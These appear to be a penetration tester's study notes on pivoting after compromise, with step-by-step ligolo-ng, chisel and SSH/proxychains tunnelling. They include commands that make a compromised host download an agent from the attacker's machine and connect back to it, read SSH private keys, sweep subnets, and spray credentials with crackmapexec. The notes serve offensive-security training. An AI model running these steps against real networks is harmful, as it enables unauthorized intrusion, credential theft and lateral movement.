## Gain Access to Target (Linux/Windows) & Enumerate

- `ip addr`
- `ifconfig `/ `ipconfig`
- `ip route`
- find config files ​[Linux PrivEsc](https://app.gitbook.com/o/BgiuuSDIn1hp261fZTz5/s/skdByKhrTDrekGP0vU0U/~/changes/591/checklists/methodology-checklist/4.0-linux-privesc) ​[Windows PrivEsc](https://app.gitbook.com/o/BgiuuSDIn1hp261fZTz5/s/skdByKhrTDrekGP0vU0U/~/changes/591/checklists/methodology-checklist/4.1-windows-privesc)​
- Check for pivoting tools, `socat`, `ligolo`, `chisel`, `proxychains`, etc.
	- If it is not installed, we can download and run statically linked binary versions instead
	- ​[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)​
## Find IPs- Linux

- `for i in {0..255}; do for j in {1..254}; do (ping -c 1 172.16.$i.$j | grep "bytes from" &) done; done; wait`
	- from ssh / nc shell NOT with proxychains4 as it may not work
	- also enumerate more IPs in subnet with (**change for different subnets!**):
- Windows - `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"`
	- from cmd
- SSH Keys: `cat ~/.ssh/id_rsa`
- Reuse Credentials: Try credentials across services

---
## 1\. Ligolo-ng

## 🛠️ Attacker Machine (Kali Linux)

1. **Set Up the TUN Interface**
- This creates a virtual network interface named `ligolo` for routing traffic through the tunnel.​
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```
- Verify the interface is up:​
```bash
ip a show ligolo
```
- While the interface may appear as `DOWN` or `NO-CARRIER` in the output of `ip a`, this is typical for TUN interfaces, which don't have a physical link. The interface becomes fully operational when the Ligolo-ng proxy and agent establish a connection and the tunnel is started
2. **Start the Ligolo-ng Proxy**
- Launch the proxy with a self-signed certificate. The default listening port is `11601`.​
```bash
./proxy -selfcert
```
- If you need to specify a different listening address or port:​[docs.ligolo.ng+1GitHub+1](https://docs.ligolo.ng/sample/double/?utm_source=chatgpt.com)​
```bash
./proxy -selfcert -laddr 0.0.0.0:9001
```
- This starts the Ligolo-ng proxy, which will listen for incoming connections from agents.​
## 🖥️ Target Machine (Compromised Host)

3. **Transfer the Agent Binary**
- Depending on the target's operating system:​
	- **Windows:**
		- Use PowerShell to download the agent:​
```PowerShell
Invoke-WebRequest -Uri http://<Kali_IP>:8000/agent.exe -OutFile agent.exe
```
- Alternatively, use RDP file sharing or other file transfer methods.​
- **Linux:**
	- Use `wget` to download the agent:​
```bash
wget http://<Kali_IP>:8000/agent -O agent
chmod +x agent
```
- Ensure that the agent binary is compatible with the target's architecture and operating system.​
4. **Run the Agent**
- Execute the agent to connect back to the attacker's proxy:​
```bash
./agent -connect <Kali_IP>:11601 -ignore-cert
```
- Replace `<Kali_IP>` with the IP address of your Kali machine. The `-ignore-cert` flag is used because we're using a self-signed certificate.​
## 🧭 Back on Kali: Manage the Tunnel

5. Interact with the Ligolo-ng Console
- In the terminal where the proxy is running:​
	- List active sessions:​[S4MY9+1Vorkharium.com+1](https://s4my9.github.io/posts/ligolo/?utm_source=chatgpt.com)​
		- `session`
	- Select the appropriate session:​
		- `session <number>`
	- Start the session:​[Security Toolkit](https://securitytoolkit.github.io/wadcoms/ligolo-ng/?utm_source=chatgpt.com)​
		- `start`
	- This establishes the tunnel through the compromised host.​[GitHub+4Home+4S4MY9+4](https://www.zekosec.com/blog/use-ligolo-for-pivoting/?utm_source=chatgpt.com)​
6. **Add Routes to Access Internal Networks
- **Determine the internal network's subnet (e.g., `172.16.5.0/24`) and add a route through the `ligolo` interface:​
```bash
sudo ip route add <Target_Subnet> dev ligolo
```
- For example:​
```bash
sudo ip route add 172.16.5.0/24 dev ligolo
```
- This directs traffic destined for the internal network through the Ligolo tunnel.​
## 🔍 Access Internal Resources

- With the tunnel and routing in place, you can now interact with internal systems:​
	- List SMB Shares:
```bash
smbclient -L //172.16.5.10/ -U user%pass
```
- Scan the Internal Network:
```bash
nmap -sT -Pn -vvv 172.16.5.0/24
```
- You can also use other tools like ssh, rdp, or proxychains to access services within the internal network.​

## 🧹 Cleanup After the Engagement

- Once your testing is complete, it's important to remove the configurations to maintain a clean environment:​
	- Delete the Route:
```bash
sudo ip route del <Target_Subnet>
```
- Bring Down and Delete the TUN Interface:
```bash
sudo ip link set ligolo down
sudo ip tuntap del mode tun dev ligolo
```
- This ensures that no residual configurations interfere with future activities.​
##  Optional: Jump Box
- Setup to move files from MS02 through MS02 to Kali
```bash
listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp
```
- How to reach Kali IP now to download something? On MS02 a command like this -> wget MS01:80 , and will redirect to KALI:80
```powershell
wget http://<MS02>:80/test
```
## 🔁 Optional A: Double Pivoting (may need older version 0.5.2 if can't connect back to Kali still)

- If you need to pivot through multiple compromised hosts:
	- On Kali:​
		- Create a second TUN interface:​
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up
```
- Add a route for the next internal subnet:​
```bash
sudo ip route add <Next_Subnet> dev ligolo2
```
- On the Intermediate Host: 
	- Transfer and run the agent to connect back to the Kali machine, establishing a second tunnel.​

🔁 Optional B: Port Forwarding & Double Pivoting

1. Set Up Port Forwarding (Listener) on Internal Target 1
	- Within the Ligolo-ng session for Internal Target 1, add a listener to forward traffic from Internal Target 1 to Kali.
```bash
[Agent : MS01\user@MS01] >> listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:8000 --tcp
```
- This forwards connections from port 9001 on Internal Target 1 to port 8000 on Kali, facilitating file transfers or other communications.
2. Verify Active Listeners:
- List all active listeners to confirm that the forwarding is set up correctly.
```bash
[Agent : MS01\user@MS01] >> listener_list
```
3. Transfer and Run the Agent on Internal Target 2 via Internal Target 1
- From Internal Target 2, download the agent through the established listener on Internal Target 1.
- Or just use Evil-WinRM Upload/Download.
```PowerShell
Invoke-WebRequest -Uri http://<InternalTarget1_IP>:9001/agent.exe -OutFile agent.exe
.\agent.exe -connect <InternalTarget1_IP>:11601 -ignore-cert
```
4. In the Ligolo-ng proxy terminal, list and start the new session corresponding to Internal Target 2.
```bash
session
session <number>
start
```
5. Add a Route for the Deeper Internal Subnet:
- Direct traffic for the deeper internal network through the appropriate TUN interface.
```bash
sudo ip route add <Deeper_Subnet> dev ligolo2
```
- Replace <Deeper\_Subnet> with the subnet of the deeper internal network (e.g., 10.10.1.0/24).
- This setup allows you to reach deeper into segmented networks.​ For more detailed information and advanced configurations, you can refer to the following resources:

---

## 2. SSH + Proxychains

### 🎯 Target:
```bash
ssh -i RSA.txt -D 9050 user@10.X.X.X
```
**OR**
```bash
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215

ssh -i id_rsa -N -L 8000:127.0.0.1:8000 dev@192.168.106.150
```
> This command sets up a SOCKS proxy on port 9999 of Target, forwarding traffic to 10.4.50.215 (Kali).

Or Use ssh -L and Skip Firefox SOCKS Setup and proxychains
A simpler alternative is local port forwarding:

```bash
ssh -L 8888:127.0.0.1:8000 user@target
```

Then edit proxychains.conf and browse to:

```bash
http://127.0.0.1:8888
```
- No need to touch Firefox's proxy settings — you're creating a direct bridge from your Kali to the internal service.

### 💻 Kali
- Edit `proxychains.conf` with IP of Target and port:
```bash
sudo nano /etc/proxychains.conf
```
- `socks5 192.168.50.63 9999` ---- commands target `192.168.50.63` IP
- `socks5 127.0.0.1 9999` ---- commands target `127.0.0.1` IP
- Use proxychains:
```bash
sudo proxychains -q nmap -sT -Pn -vvv 172.16.50.217

sudo proxychains -q curl http://127.0.0.1:8000

proxychains -q smbclient -L //172.16.50.217/ -U hr_admin%Welcome1234

proxychains -q crackmapexec smb 172.16.5.0/24 -u user -p pass






	- Open in firefox
		- Configure Firefox to Use the SOCKS Proxy Directly
		- Go to: `about:preferences` → Scroll down to **Network Settings**
		- Click **Settings...** under “Network Settings”
		- Select:
			- `Manual proxy configuration
			- SOCKS Host: 127.0.0.1
			- Port: 9050
			- SOCKS v5 [✔]
			- Proxy DNS when using SOCKS v5`
		- Click OK.



```
- Optimize proxychains timeouts in the config:
```bash
tcp_read_time_out 1000 4
tcp_connect_time_out 800
```

---

## 3. Chisel

### 💻 Kali
- Start the Chisel server:
```bash
chisel server -p 9999 --reverse
```
> This starts the Chisel server on port 9999, ready to accept reverse connections.

### 🎯 Target
- Run Chisel client:
```bash
./chisel client <Kali_IP>:9999 R:1080:socks
```
> This sets up a SOCKS proxy on Kali's port 1080 by connecting back to it from the target.

### 💻 Kali Again
- Edit `proxychains.conf` with IP of Target and port:
```bash
sudo nano /etc/proxychains.conf
```
- `socks5 192.168.50.63 9999`
- Use proxychains:
```bash
sudo proxychains -q nmap -sT -Pn -vvv 172.16.50.217

proxychains -q smbclient -L //172.16.50.217/ -U hr_admin%Welcome1234

proxychains -q crackmapexec smb 172.16.5.0/24 -u user -p pass
```
- Optimize proxychains timeouts in the config:
```bash
tcp_read_time_out 1000 4
tcp_connect_time_out 800
```

---
More notes:
- [GitBook Pivot Notes](https://app.gitbook.com/o/BgiuuSDIn1hp261fZTz5/s/skdByKhrTDrekGP0vU0U/checklists/methodology-checklist/3.0-pivoting-lateral-movement)
- [PEN-200 Pivoting Notes](obsidian://open?vault=Wizard-Book&file=OffSec%2FOSCP%2B%2FCourse%2F20.%20Tunneling%20Through%20Deep%20Packet%20Inspection)